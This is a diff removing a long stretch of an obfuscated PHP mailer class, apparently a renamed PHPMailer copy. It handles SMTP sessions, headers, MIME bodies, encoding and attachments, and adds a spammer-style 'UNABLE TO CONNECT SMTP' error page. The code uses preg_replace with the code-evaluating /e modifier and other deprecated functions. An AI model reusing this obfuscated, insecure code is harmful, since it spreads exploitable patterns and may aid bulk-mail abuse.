-		if(!$this->SmtpConnect()) {echo "FAILED !!<p align=\"center\"><font color=\"#D4001A\" style=\"font-style:14pt\"> MAILER IS UNABLE TO CONNECT SMTP !!</font></p>";die();
-		  return false;
-		}
-
-		$x92 = ($this->Sender == '') ? $this->From : $this->Sender;
-		if(!$this->smtp->Mail($x92)) {
-		  $x32 = $this->Lang('from_failed') . $x92;
-		  $this->SetError($x32);
-		  $this->smtp->Reset();
-		  return false;
-		}
-
-		/* Attempt to send attach all recipients */
-		for($x8c = 0; $x8c < count($this->to); $x8c++) {
-		  if(!$this->smtp->Recipient($this->to[$x8c][0])) {
-			$x91[] = $this->to[$x8c][0];
-		  }
-		}
-		for($x8c = 0; $x8c < count($this->cc); $x8c++) {
-		  if(!$this->smtp->Recipient($this->cc[$x8c][0])) {
-			$x91[] = $this->cc[$x8c][0];
-		  }
-		}
-		for($x8c = 0; $x8c < count($this->bcc); $x8c++) {
-		  if(!$this->smtp->Recipient($this->bcc[$x8c][0])) {
-			$x91[] = $this->bcc[$x8c][0];
-		  }
-		}
-
-		if(count($x91) > 0) { // Create error message
-		  for($x8c = 0; $x8c < count($x91); $x8c++) {
-			if($x8c != 0) {
-			  $x32 .= ', ';
-			}
-			$x32 .= $x91[$x8c];
-
-		  }
-		  $x32 = $this->Lang('recipients_failed') . $x32;
-		  $this->SetError($x32);
-		  $this->smtp->Reset();
-		  return false;
-		}
-
-		if(!$this->smtp->Data($x87 . $x88)) {
-		  $this->SetError($this->Lang('data_not_accepted'));
-		  $this->smtp->Reset();
-		  return false;
-		}
-		if($this->SMTPKeepAlive == true) {
-		  $this->smtp->Reset();
-		} else {
-		  $this->SmtpClose();
-		}
-
-		return true;
-	  }
-
-	  /**
-	   * Initiates a connection to an SMTP server.  Returns false if the
-	   * operation failed.
-	   * @access private
-	   * @return bool
-	   */
-	  function SmtpConnect() {
-		if($this->smtp == NULL) {
-		  $this->smtp = new SMTP();
-		}
-
-		$this->smtp->do_debug = $this->SMTPDebug;
-		$x93 = explode(';', $this->Host);
-		$x94 = 0;
-		$x95 = ($this->smtp->Connected());
-
-		/* Retry while there is no connection */
-		while($x94 < count($x93) && $x95 == false) {
-		  $x96 = array();
-		  if(eregi('^(.+):([0-9]+)$', $x93[$x94], $x96)) {
-			$x34 = $x96[1];
-			$x35 = $x96[2];
-		  } else {
-			$x34 = $x93[$x94];
-			$x35 = $this->Port;
-		  }
-
-		  if($this->smtp->Connect(((!empty($this->SMTPSecure))?$this->SMTPSecure.'://':'').$x34, $x35, $this->Timeout)) {
-			if ($this->Helo != '') {
-			  $this->smtp->Hello($this->Helo);
-			} else {
-			  $this->smtp->Hello($this->ServerHostname());
-			}
-
-			$x95 = true;
-			if($this->SMTPAuth) {
-			  if(!$this->smtp->Authenticate($this->Username, $this->Password)) {
-				$this->SetError($this->Lang('authenticate'));
-				$this->smtp->Reset();
-				$x95 = false;
-			  }
-			}
-		  }
-		  $x94++;
-		}
-		if(!$x95) {
-		  $this->SetError($this->Lang('connect_host'));
-		}
-
-		return $x95;
-	  }
-
-	  /**
-	   * Closes the active SMTP session if one exists.
-	   * @return void
-	   */
-	  function SmtpClose() {
-		if($this->smtp != NULL) {
-		  if($this->smtp->Connected()) {
-			$this->smtp->Quit();
-			$this->smtp->Close();
-		  }
-		}
-	  }
-
-	  /**
-	   * Sets the language for all class error messages.  Returns false
-	   * if it cannot load the language file.  The default language type
-	   * is English.
-	   * @param string $x97 Type of language (e.g. Portuguese: "br")
-	   * @param string $x98 Path to the language file directory
-	   * @access public
-	   * @return bool
-	   */
-	  function SetLanguage($x97, $x98 = 'language/') {
-		if(file_exists($x98.'phpmailer.lang-'.$x97.'.php')) {
-		  include($x98.'phpmailer.lang-'.$x97.'.php');
-		} elseif (file_exists($x98.'phpmailer.lang-en.php')) {
-		  include($x98.'phpmailer.lang-en.php');
-		} else {
-		  $this->SetError('Could not load language file');
-		  return false;
-		}
-		$this->language = $x99;
-
-		return true;
-	  }
-
-	  /////////////////////////////////////////////////
-	  // METHODS, MESSAGE CREATION
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Creates recipient headers.
-	   * @access private
-	   * @return string
-	   */
-	  function AddrAppend($x9a, $x9b) {
-		$x9c = $x9a . ': ';
-		$x9c .= $this->AddrFormat($x9b[0]);
-		if(count($x9b) > 1) {
-		  for($x8c = 1; $x8c < count($x9b); $x8c++) {
-			$x9c .= ', ' . $this->AddrFormat($x9b[$x8c]);
-		  }
-		}
-		$x9c .= $this->LE;
-
-		return $x9c;
-	  }
-
-	  /**
-	   * Formats an address correctly.
-	   * @access private
-	   * @return string
-	   */
-	  function AddrFormat($x9b) {
-		if(empty($x9b[1])) {
-		  $x9d = $this->SecureHeader($x9b[0]);
-		} else {
-		  $x9d = $this->EncodeHeader($this->SecureHeader($x9b[1]), 'phrase') . " <" . $this->SecureHeader($x9b[0]) . ">";
-		}
-
-		return $x9d;
-	  }
-
-	  /**
-	   * Wraps message for use with mailers that do not
-	   * automatically perform wrapping and for quoted-printable.
-	   * Original written by philippe.
-	   * @access private
-	   * @return string
-	   */
-	  function WrapText($x19, $x9e, $x9f = false) {
-		$xa0 = ($x9f) ? sprintf(" =%s", $this->LE) : $this->LE;
-		// If utf-8 encoding is used, we will need to make sure we don't
-		// split multibyte characters when we wrap
-		$xa1 = (strtolower($this->CharSet) == "utf-8");
-
-		$x19 = $this->FixEOL($x19);
-		if (substr($x19, -1) == $this->LE) {
-		  $x19 = substr($x19, 0, -1);
-		}
-
-		$x44 = explode($this->LE, $x19);
-		$x19 = '';
-		for ($x8c=0 ;$x8c < count($x44); $x8c++) {
-		  $xa2 = explode(' ', $x44[$x8c]);
-		  $xa3 = '';
-		  for ($x53 = 0; $x53<count($xa2); $x53++) {
-			$xa4 = $xa2[$x53];
-			if ($x9f and (strlen($xa4) > $x9e)) {
-			  $xa5 = $x9e - strlen($xa3) - 1;
-			  if ($x53 != 0) {
-				if ($xa5 > 20) {
-				  $xa6 = $xa5;
-				  if ($xa1) {
-					$xa6 = $this->UTF8CharBoundary($xa4, $xa6);
-				  } elseif (substr($xa4, $xa6 - 1, 1) == "=") {
-					$xa6--;
-				  } elseif (substr($xa4, $xa6 - 2, 1) == "=") {
-					$xa6 -= 2;
-				  }
-				  $xa7 = substr($xa4, 0, $xa6);
-				  $xa4 = substr($xa4, $xa6);
-				  $xa3 .= ' ' . $xa7;
-				  $x19 .= $xa3 . sprintf("=%s", $this->LE);
-				} else {
-				  $x19 .= $xa3 . $xa0;
-				}
-				$xa3 = '';
-			  }
-			  while (strlen($xa4) > 0) {
-				$xa6 = $x9e;
-				if ($xa1) {
-				  $xa6 = $this->UTF8CharBoundary($xa4, $xa6);
-				} elseif (substr($xa4, $xa6 - 1, 1) == "=") {
-				  $xa6--;
-				} elseif (substr($xa4, $xa6 - 2, 1) == "=") {
-				  $xa6 -= 2;
-				}
-				$xa7 = substr($xa4, 0, $xa6);
-				$xa4 = substr($xa4, $xa6);
-
-				if (strlen($xa4) > 0) {
-				  $x19 .= $xa7 . sprintf("=%s", $this->LE);
-				} else {
-				  $xa3 = $xa7;
-				}
-			  }
-			} else {
-			  $xa8 = $xa3;
-			  $xa3 .= ($x53 == 0) ? $xa4 : (' ' . $xa4);
-
-			  if (strlen($xa3) > $x9e and $xa8 != '') {
-				$x19 .= $xa8 . $xa0;
-				$xa3 = $xa4;
-			  }
-			}
-		  }
-		  $x19 .= $xa3 . $this->LE;
-		}
-
-		return $x19;
-	  }
-
-	  /**
-	   * Finds last character boundary prior to maxLength in a utf-8
-	   * quoted (printable) encoded string.
-	   * Original written by Colin Brown.
-	   * @access private
-	   * @param string $xa9 utf-8 QP text
-	   * @param int    $xaa   find last character boundary prior to this length
-	   * @return int
-	   */
-	  function UTF8CharBoundary($xa9, $xaa) {
-		$xab = false;
-		$xac = 3;
-		while (!$xab) {
-		  $xad = substr($xa9, $xaa - $xac, $xac);
-		  $xae = strpos($xad, "=");
-		  if ($xae !== false) {
-			// Found start of encoded character byte within $xac block.
-			// Check the encoded byte value (the 2 chars after the '=')
-			$xaf = substr($xa9, $xaa - $xac + $xae + 1, 2);
-			$xb0 = hexdec($xaf);
-			if ($xb0 < 128) { // Single byte character.
-			  // If the encoded char was found at pos 0, it will fit
-			  // otherwise reduce maxLength to start of the encoded char
-			  $xaa = ($xae == 0) ? $xaa :
-			  $xaa - ($xac - $xae);
-			  $xab = true;
-			} elseif ($xb0 >= 192) { // First byte of a multi byte character
-			  // Reduce maxLength to split at start of character
-			  $xaa = $xaa - ($xac - $xae);
-			  $xab = true;
-			} elseif ($xb0 < 192) { // Middle byte of a multi byte character, look further back
-			  $xac += 3;
-			}
-		  } else {
-			// No encoded character found
-			$xab = true;
-		  }
-		}
-		return $xaa;
-	  }
-
-	  /**
-	   * Set the body wrapping.
-	   * @access private
-	   * @return void
-	   */
-	  function SetWordWrap() {
-		if($this->WordWrap < 1) {
-		  return;
-		}
-
-		switch($this->message_type) {
-		  case 'alt':
-			/* fall through */
-		  case 'alt_attachments':
-			$this->AltBody = $this->WrapText($this->AltBody, $this->WordWrap);
-			break;
-		  default:
-			$this->Body = $this->WrapText($this->Body, $this->WordWrap);
-			break;
-		}
-	  }
-
-	  /**
-	   * Assembles message header.
-	   * @access private
-	   * @return string
-	   */
-	  function CreateHeader() {
-		$x89 = '';
-
-		/* Set the boundaries */
-		$xb1 = md5(uniqid(time()));
-		$this->boundary[1] = 'b1_' . $xb1;
-		$this->boundary[2] = 'b2_' . $xb1;
-
-		$x89 .= $this->HeaderLine('Date', $this->RFCDate());
-		if($this->Sender == '') {
-		  $x89 .= $this->HeaderLine('Return-Path', trim($this->From));
-		} else {
-		  $x89 .= $this->HeaderLine('Return-Path', trim($this->Sender));
-		}
-
-		/* To be created automatically by mail() */
-		if($this->Mailer != 'mail') {
-		  if(count($this->to) > 0) {
-			$x89 .= $this->AddrAppend('To', $this->to);
-		  } elseif (count($this->cc) == 0) {
-			$x89 .= $this->HeaderLine('To', 'undisclosed-recipients:;');
-		  }
-		  if(count($this->cc) > 0) {
-			$x89 .= $this->AddrAppend('Cc', $this->cc);
-		  }
-		}
-
-		$x1b = array();
-		$x1b[0][0] = trim($this->From);
-		$x1b[0][1] = $this->FromName;
-		$x89 .= $this->AddrAppend('From', $x1b);
-
-		/* sendmail and mail() extract Cc from the header before sending */
-		if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->cc) > 0)) {
-		  $x89 .= $this->AddrAppend('Cc', $this->cc);
-		}
-
-		/* sendmail and mail() extract Bcc from the header before sending */
-		if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->bcc) > 0)) {
-		  $x89 .= $this->AddrAppend('Bcc', $this->bcc);
-		}
-		if($x22 != "")
-		{
-		if(count($this->ReplyTo) > 0) {
-		  $x89 .= $this->AddrAppend('Reply-To', $this->ReplyTo);
-		}
-		}
-		/* mail() sets the subject itself */
-		if($this->Mailer != 'mail') {
-		  $x89 .= $this->HeaderLine('Subject', $this->EncodeHeader($this->SecureHeader($this->Subject)));
-		}
-
-		if($this->MessageID != '') {
-		  $x89 .= $this->HeaderLine('Message-ID',$this->MessageID);
-		} else {
-		  $x89 .= sprintf("Message-ID: <%s@%s>%s", $xb1, $this->ServerHostname(), $this->LE);
-		}
-		$x89 .= $this->HeaderLine('X-Priority', $this->Priority);
-		if($this->ConfirmReadingTo != '') {
-		  $x89 .= $this->HeaderLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>');
-		}
-
-		// Add custom headers
-		for($x94 = 0; $x94 < count($this->CustomHeader); $x94++) {
-		  $x89 .= $this->HeaderLine(trim($this->CustomHeader[$x94][0]), $this->EncodeHeader(trim($this->CustomHeader[$x94][1])));
-		}
-		if (!$this->sign_key_file) {
-		  $x89 .= $this->HeaderLine('MIME-Version', '1.0');
-		  $x89 .= $this->GetMailMIME();
-		}
-
-		return $x89;
-	  }
-
-	  /**
-	   * Returns the message MIME.
-	   * @access private
-	   * @return string
-	   */
-	  function GetMailMIME() {
-		$x89 = '';
-		switch($this->message_type) {
-		  case 'plain':
-			$x89 .= $this->HeaderLine('Content-Transfer-Encoding', $this->Encoding);
-			$x89 .= sprintf("Content-Type: %s; charset=\"%s\"", $this->ContentType, $this->CharSet);
-			break;
-		  case 'attachments':
-			/* fall through */
-		  case 'alt_attachments':
-			if($this->InlineImageExists()){
-			  $x89 .= sprintf("Content-Type: %s;%s\ttype=\"text/html\";%s\tboundary=\"%s\"%s", 'multipart/related', $this->LE, $this->LE, $this->boundary[1], $this->LE);
-			} else {
-			  $x89 .= $this->HeaderLine('Content-Type', 'multipart/mixed;');
-			  $x89 .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
-			}
-			break;
-		  case 'alt':
-			$x89 .= $this->HeaderLine('Content-Type', 'multipart/alternative;');
-			$x89 .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
-			break;
-		}
-
-		if($this->Mailer != 'mail') {
-		  $x89 .= $this->LE.$this->LE;
-		}
-
-		return $x89;
-	  }
-
-	  /**
-	   * Assembles the message body.  Returns an empty string on failure.
-	   * @access private
-	   * @return string
-	   */
-	  function CreateBody() {
-		$x89 = '';
-		if ($this->sign_key_file) {
-		  $x89 .= $this->GetMailMIME();
-		}
-
-		$this->SetWordWrap();
-
-		switch($this->message_type) {
-		  case 'alt':
-			$x89 .= $this->GetBoundary($this->boundary[1], '', 'text/plain', '');
-			$x89 .= $this->EncodeString($this->AltBody, $this->Encoding);
-			$x89 .= $this->LE.$this->LE;
-			$x89 .= $this->GetBoundary($this->boundary[1], '', 'text/html', '');
-			$x89 .= $this->EncodeString($this->Body, $this->Encoding);
-			$x89 .= $this->LE.$this->LE;
-			$x89 .= $this->EndBoundary($this->boundary[1]);
-			break;
-		  case 'plain':
-			$x89 .= $this->EncodeString($this->Body, $this->Encoding);
-			break;
-		  case 'attachments':
-			$x89 .= $this->GetBoundary($this->boundary[1], '', '', '');
-			$x89 .= $this->EncodeString($this->Body, $this->Encoding);
-			$x89 .= $this->LE;
-			$x89 .= $this->AttachAll();
-			break;
-		  case 'alt_attachments':
-			$x89 .= sprintf("--%s%s", $this->boundary[1], $this->LE);
-			$x89 .= sprintf("Content-Type: %s;%s" . "\tboundary=\"%s\"%s", 'multipart/alternative', $this->LE, $this->boundary[2], $this->LE.$this->LE);
-			$x89 .= $this->GetBoundary($this->boundary[2], '', 'text/plain', '') . $this->LE; // Create text body
-			$x89 .= $this->EncodeString($this->AltBody, $this->Encoding);
-			$x89 .= $this->LE.$this->LE;
-			$x89 .= $this->GetBoundary($this->boundary[2], '', 'text/html', '') . $this->LE; // Create the HTML body
-			$x89 .= $this->EncodeString($this->Body, $this->Encoding);
-			$x89 .= $this->LE.$this->LE;
-			$x89 .= $this->EndBoundary($this->boundary[2]);
-			$x89 .= $this->AttachAll();
-			break;
-		}
-
-		if($this->IsError()) {
-		  $x89 = '';
-		} else if ($this->sign_key_file) {
-		  $x29 = tempnam("", "mail");
-		  $xb2 = fopen($x29, "w");
-		  fwrite($xb2, $x89);
-		  fclose($xb2);
-		  $xb3 = tempnam("", "signed");
-
-		  if (@openssl_pkcs7_sign($x29, $xb3, "file://".$this->sign_key_file, array("file://".$this->sign_key_file, $this->sign_key_pass), null)) {
-			$xb2 = fopen($xb3, "r");
-			$x89 = fread($xb2, filesize($this->sign_key_file));
-			fclose($xb2);
-		  } else {
-			$this->SetError($this->Lang("signing").openssl_error_string());
-			$x89 = '';
-		  }
-
-		  unlink($x29);
-		  unlink($xb3);
-		}
-
-		return $x89;
-	  }
-
-	  /**
-	   * Returns the start of a message boundary.
-	   * @access private
-	   */
-	  function GetBoundary($x7e, $xb4, $xb5, $xb6) {
-		$x89 = '';
-		if($xb4 == '') {
-		  $xb4 = $this->CharSet;
-		}
-		if($xb5 == '') {
-		  $xb5 = $this->ContentType;
-		}
-		if($xb6 == '') {
-		  $xb6 = $this->Encoding;
-		}
-		$x89 .= $this->TextLine('--' . $x7e);
-		$x89 .= sprintf("Content-Type: %s; charset = \"%s\"", $xb5, $xb4);
-		$x89 .= $this->LE;
-		$x89 .= $this->HeaderLine('Content-Transfer-Encoding', $xb6);
-		$x89 .= $this->LE;
-
-		return $x89;
-	  }
-
-	  /**
-	   * Returns the end of a message boundary.
-	   * @access private
-	   */
-	  function EndBoundary($x7e) {
-		return $this->LE . '--' . $x7e . '--' . $this->LE;
-	  }
-
-	  /**
-	   * Sets the message type.
-	   * @access private
-	   * @return void
-	   */
-	  function SetMessageType() {
-		if(count($this->attachment) < 1 && strlen($this->AltBody) < 1) {
-		  $this->message_type = 'plain';
-		} else {
-		  if(count($this->attachment) > 0) {
-			$this->message_type = 'attachments';
-		  }
-		  if(strlen($this->AltBody) > 0 && count($this->attachment) < 1) {
-			$this->message_type = 'alt';
-		  }
-		  if(strlen($this->AltBody) > 0 && count($this->attachment) > 0) {
-			$this->message_type = 'alt_attachments';
-		  }
-		}
-	  }
-
-	  /* Returns a formatted header line.
-	   * @access private
-	   * @return string
-	   */
-	  function HeaderLine($x48, $x14) {
-		return $x48 . ': ' . $x14 . $this->LE;
-	  }
-
-	  /**
-	   * Returns a formatted mail line.
-	   * @access private
-	   * @return string
-	   */
-	  function TextLine($x14) {
-		return $x14 . $this->LE;
-	  }
-
-	  /////////////////////////////////////////////////
-	  // CLASS METHODS, ATTACHMENTS
-	  /////////////////////////////////////////////////
-
-	  /**
-	   * Adds an attachment from a path on the filesystem.
-	   * Returns false if the file could not be found
-	   * or accessed.
-	   * @param string $xb7 Path to the attachment.
-	   * @param string $x48 Overrides the attachment name.
-	   * @param string $xb6 File encoding (see $x5c).
-	   * @param string $x9a File extension (MIME) type.
-	   * @return bool
-	   */
-	  function AddAttachment($xb7, $x48 = '', $xb6 = 'base64', $x9a = 'application/octet-stream') {
-		if(!@is_file($xb7)) {
-		  $this->SetError($this->Lang('file_access') . $xb7);
-		  return false;
-		}
-
-		$xb8 = basename($xb7);
-		if($x48 == '') {
-		  $x48 = $xb8;
-		}
-
-		$x86 = count($this->attachment);
-		$this->attachment[$x86][0] = $xb7;
-		$this->attachment[$x86][1] = $xb8;
-		$this->attachment[$x86][2] = $x48;
-		$this->attachment[$x86][3] = $xb6;
-		$this->attachment[$x86][4] = $x9a;
-		$this->attachment[$x86][5] = false; // isStringAttachment
-		$this->attachment[$x86][6] = 'attachment';
-		$this->attachment[$x86][7] = 0;
-
-		return true;
-	  }
-
-	  /**
-	   * Attaches all fs, string, and binary attachments to the message.
-	   * Returns an empty string on failure.
-	   * @access private
-	   * @return string
-	   */
-	  function AttachAll() {
-		/* Return text of body */
-		$xb9 = array();
-
-		/* Add all attachments */
-		for($x8c = 0; $x8c < count($this->attachment); $x8c++) {
-		  /* Check for string attachment */
-		  $xba = $this->attachment[$x8c][5];
-		  if ($xba) {
-			$x15 = $this->attachment[$x8c][0];
-		  } else {
-			$xb7 = $this->attachment[$x8c][0];
-		  }
-
-		  $xb8    = $this->attachment[$x8c][1];
-		  $x48        = $this->attachment[$x8c][2];
-		  $xb6    = $this->attachment[$x8c][3];
-		  $x9a        = $this->attachment[$x8c][4];
-		  $xbb = $this->attachment[$x8c][6];
-		  $xbc         = $this->attachment[$x8c][7];
-
-		  $xb9[] = sprintf("--%s%s", $this->boundary[1], $this->LE);
-		  $xb9[] = sprintf("Content-Type: %s; name=\"%s\"%s", $x9a, $x48, $this->LE);
-		  $xb9[] = sprintf("Content-Transfer-Encoding: %s%s", $xb6, $this->LE);
-
-		  if($xbb == 'inline') {
-			$xb9[] = sprintf("Content-ID: <%s>%s", $xbc, $this->LE);
-		  }
-
-		  $xb9[] = sprintf("Content-Disposition: %s; filename=\"%s\"%s", $xbb, $x48, $this->LE.$this->LE);
-
-		  /* Encode as string attachment */
-		  if($xba) {
-			$xb9[] = $this->EncodeString($x15, $xb6);
-			if($this->IsError()) {
-			  return '';
-			}
-			$xb9[] = $this->LE.$this->LE;
-		  } else {
-			$xb9[] = $this->EncodeFile($xb7, $xb6);
-			if($this->IsError()) {
-			  return '';
-			}
-			$xb9[] = $this->LE.$this->LE;
-		  }
-		}
-
-		$xb9[] = sprintf("--%s--%s", $this->boundary[1], $this->LE);
-
-		return join('', $xb9);
-	  }
-
-	  /**
-	   * Encodes attachment in requested format.  Returns an
-	   * empty string on failure.
-	   * @access private
-	   * @return string
-	   */
-	  function EncodeFile ($xb7, $xb6 = 'base64') {
-		if(!@$xbd = fopen($xb7, 'rb')) {
-		  $this->SetError($this->Lang('file_open') . $xb7);
-		  return '';
-		}
-		$xbe = get_magic_quotes_runtime();
-		set_magic_quotes_runtime(0);
-		$xbf = fread($xbd, filesize($xb7));
-		$xbf = $this->EncodeString($xbf, $xb6);
-		fclose($xbd);
-		set_magic_quotes_runtime($xbe);
-
-		return $xbf;
-	  }
-
-	  /**
-	   * Encodes string to requested format. Returns an
-	   * empty string on failure.
-	   * @access private
-	   * @return string
-	   */
-	  function EncodeString ($x12, $xb6 = 'base64') {
-		$xc0 = '';
-		switch(strtolower($xb6)) {
-		  case 'base64':
-			/* chunk_split is found in PHP >= 3.0.6 */
-			$xc0 = chunk_split(base64_encode($x12), 76, $this->LE);
-			break;
-		  case '7bit':
-		  case '8bit':
-			$xc0 = $this->FixEOL($x12);
-			if (substr($xc0, -(strlen($this->LE))) != $this->LE)
-			  $xc0 .= $this->LE;
-			break;
-		  case 'binary':
-			$xc0 = $x12;
-			break;
-		  case 'quoted-printable':
-			$xc0 = $this->EncodeQP($x12);
-			break;
-		  default:
-			$this->SetError($this->Lang('encoding') . $xb6);
-			break;
-		}
-		return $xc0;
-	  }
-
-	  /**
-	   * Encode a header string to best of Q, B, quoted or none.
-	   * @access private
-	   * @return string
-	   */
-	  function EncodeHeader ($x12, $xc1 = 'text') {
-		$xc2 = 0;
-
-		switch (strtolower($xc1)) {
-		  case 'phrase':
-			if (!preg_match('/[\200-\377]/', $x12)) {
-			  /* Can't use addslashes as we don't know what value has magic_quotes_sybase. */
-			  $xc0 = addcslashes($x12, "\0..\37\177\\\"");
-			  if (($x12 == $xc0) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $x12)) {
-				return ($xc0);
-			  } else {
-				return ("\"$xc0\"");
-			  }
-			}
-			$xc2 = preg_match_all('/[^\040\041\043-\133\135-\176]/', $x12, $xc3);
-			break;
-		  case 'comment':
-			$xc2 = preg_match_all('/[()"]/', $x12, $xc3);
-			/* Fall-through */
-		  case 'text':
-		  default:
-			$xc2 += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $x12, $xc3);
-			break;
-		}
-
-		if ($xc2 == 0) {
-		  return ($x12);
-		}
-
-		$xc4 = 75 - 7 - strlen($this->CharSet);
-		/* Try to select the encoding which should produce the shortest output */
-		if (strlen($x12)/3 < $xc2) {
-		  $xb6 = 'B';
-		  if (function_exists('mb_strlen') && $this->HasMultiBytes($x12)) {
-		 // Use a custom function which correctly encodes and wraps long
-		 // multibyte strings without breaking lines within a character
-			$xc0 = $this->Base64EncodeWrapMB($x12);
-		  } else {
-			$xc0 = base64_encode($x12);
-			$xc4 -= $xc4 % 4;
-			$xc0 = trim(chunk_split($xc0, $xc4, "\n"));
-		  }
-		} else {
-		  $xb6 = 'Q';
-		  $xc0 = $this->EncodeQ($x12, $xc1);
-		  $xc0 = $this->WrapText($xc0, $xc4, true);
-		  $xc0 = str_replace('='.$this->LE, "\n", trim($xc0));
-		}
-
-		$xc0 = preg_replace('/^(.*)$/m', " =?".$this->CharSet."?$xb6?\\1?=", $xc0);
-		$xc0 = trim(str_replace("\n", $this->LE, $xc0));
-
-		return $xc0;
-	  }
-
-	  /**
-	   * Checks if a string contains multibyte characters.
-	   * @access private
-	   * @param string $x12 multi-byte text to wrap encode
-	   * @return bool
-	   */
-	  function HasMultiBytes($x12) {
-		if (function_exists('mb_strlen')) {
-		  return (strlen($x12) > mb_strlen($x12, $this->CharSet));
-		} else { // Assume no multibytes (we can't handle without mbstring functions anyway)
-		  return False;
-		}
-	  }
-
-	  /**
-	   * Correctly encodes and wraps long multibyte strings for mail headers
-	   * without breaking lines within a character.
-	   * Adapted from a function by paravoid at http://uk.php.net/manual/en/function.mb-encode-mimeheader.php
-	   * @access private
-	   * @param string $x12 multi-byte text to wrap encode
-	   * @return string
-	   */
-	  function Base64EncodeWrapMB($x12) {
-		$xc5 = "=?".$this->CharSet."?B?";
-		$xc6 = "?=";
-		$xc0 = "";
-
-		$xc7 = mb_strlen($x12, $this->CharSet);
-		// Each line must have length <= 75, including $xc5 and $xc6
-		$x9e = 75 - strlen($xc5) - strlen($xc6);
-		// Average multi-byte ratio
-		$xc8 = $xc7 / strlen($x12);
-		// Base64 has a 4:3 ratio
-		$xc9 = $xca = floor($x9e * $xc8 * .75);
-
-		for ($x8c = 0; $x8c < $xc7; $x8c += $xc9) {
-		  $xac = 0;
-
-		  do {
-			$xc9 = $xca - $xac;
-			$xcb = mb_substr($x12, $x8c, $xc9, $this->CharSet);
-			$xcb = base64_encode($xcb);
-			$xac++;
-		  }
-		  while (strlen($xcb) > $x9e);
-
-		  $xc0 .= $xcb . $this->LE;
-		}
-
-		// Chomp the last linefeed
-		$xc0 = substr($xc0, 0, -strlen($this->LE));
-		return $xc0;
-	  }
-
-	  /**
-	   * Encode string to quoted-printable.
-	   * @access private
-	   * @return string
-	   */
-	  function EncodeQP( $xcc = '', $xcd = 76, $xce = false ) {
-		$xaf = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
-		$x40 = preg_split('/(?:\r\n|\r|\n)/', $xcc);
-		$xcf = "\r\n";
-		$xd0 = '=';
-		$xd1 = '';
-		while( list(, $x44) = each($x40) ) {
-		  $xd2 = strlen($x44);
-		  $xd3 = '';
-		  for($x8c = 0; $x8c < $xd2; $x8c++) {
-			$xd4 = substr( $x44, $x8c, 1 );
-			$xb0 = ord( $xd4 );
-			if ( ( $x8c == 0 ) && ( $xb0 == 46 ) ) { // convert first point in the line into =2E
-			  $xd4 = '=2E';
-			}
-			if ( $xb0 == 32 ) {
-			  if ( $x8c == ( $xd2 - 1 ) ) { // convert space at eol only
-				$xd4 = '=20';
-			  } else if ( $xce ) {
-				$xd4 = '=20';
-			  }
-			} elseif ( ($xb0 == 61) || ($xb0 < 32 ) || ($xb0 > 126) ) { // always encode "\t", which is *not* required
-			  $xd5 = floor($xb0/16);
-			  $xd6 = floor($xb0%16);
-			  $xd4 = $xd0.$xaf[$xd5].$xaf[$xd6];
-			}
-			if ( (strlen($xd3) + strlen($xd4)) >= $xcd ) { // CRLF is not counted
-			  $xd1 .= $xd3.$xd0.$xcf; //  soft line break; " =\r\n" is okay
-			  $xd3 = '';
-			  // check if newline first character will be point or not
-			  if ( $xb0 == 46 ) {
-				$xd4 = '=2E';
-			  }
-			}
-			$xd3 .= $xd4;
-		  } // end of for
-		  $xd1 .= $xd3.$xcf;
-		} // end of while
-		return trim($xd1);
-	  }
-
-	  /**
-	   * Encode string to q encoding.
-	   * @access private
-	   * @return string
-	   */
-	  function EncodeQ ($x12, $xc1 = 'text') {
-		/* There should not be any EOL in the string */
-		$xc0 = preg_replace("[\r\n]", '', $x12);
-
-		switch (strtolower($xc1)) {
-		  case 'phrase':
-			$xc0 = preg_replace("/([^A-Za-z0-9!*+\/ -])/e", "'='.sprintf('%02X', ord('\\1'))", $xc0);
-			break;
-		  case 'comment':
-			$xc0 = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('\\1'))", $xc0);
-		  case 'text':
-		  default:
-			/* Replace every high ascii, control =, ? and _ characters */
-			$xc0 = preg_replace('/([\000-\011\013\014\016-\037\075\077\137\177-\377])/e',
-				  "'='.sprintf('%02X', ord('\\1'))", $xc0);
-			break;
-		}
-
-		/* Replace every spaces to _ (more readable than =20) */
-		$xc0 = str_replace(' ', '_', $xc0);
-
-		return $xc0;
-	  }
-
-	  /**
-	   * Adds a string or binary attachment (non-filesystem) to the list.
-	   * This method can be used to attach ascii or binary data,
-	   * such as a BLOB record from a database.
-	   * @param string $x15 String attachment data.
-	   * @param string $xb8 Name of the attachment.
-	   * @param string $xb6 File encoding (see $x5c).
-	   * @param string $x9a File extension (MIME) type.
-	   * @return void
-	   */
-	  function AddStringAttachment($x15, $xb8, $xb6 = 'base64', $x9a = 'application/octet-stream') {
-		/* Append to $x7b array */
-		$x86 = count($this->attachment);
-		$this->attachment[$x86][0] = $x15;
-		$this->attachment[$x86][1] = $xb8;
-		$this->attachment[$x86][2] = $xb8;
-		$this->attachment[$x86][3] = $xb6;
-		$this->attachment[$x86][4] = $x9a;
-		$this->attachment[$x86][5] = true; // isString
-		$this->attachment[$x86][6] = 'attachment';
-		$this->attachment[$x86][7] = 0;
-	  }
-
-	  /**
-	   * Adds an embedded attachment.  This can include images, sounds, and
-	   * just about any other document.  Make sure to set the $x9a to an
-	   * image type.  For JPEG images use "image/jpeg" and for GIF images
-	   * use "image/gif".
-	   * @param string $xb7 Path to the attachment.
-	   * @param string $xbc Content ID of the attachment.  Use this to identify
-	   *        the Id for accessing the image in an HTML form.
-	   * @param string $x48 Overrides the attachment name.
-	   * @param string $xb6 File encoding (see $x5c).
-	   * @param string $x9a File extension (MIME) type.
-	   * @return bool
-	   */
-	  function AddEmbeddedImage($xb7, $xbc, $x48 = '', $xb6 = 'base64', $x9a = 'application/octet-stream') {
-
-		if(!@is_file($xb7)) {
-		  $this->SetError($this->Lang('file_access') . $xb7);
-		  return false;
-		}
-
-		$xb8 = basename($xb7);
-		if($x48 == '') {
-		  $x48 = $xb8;
-		}
-
-		/* Append to $x7b array */
-		$x86 = count($this->attachment);
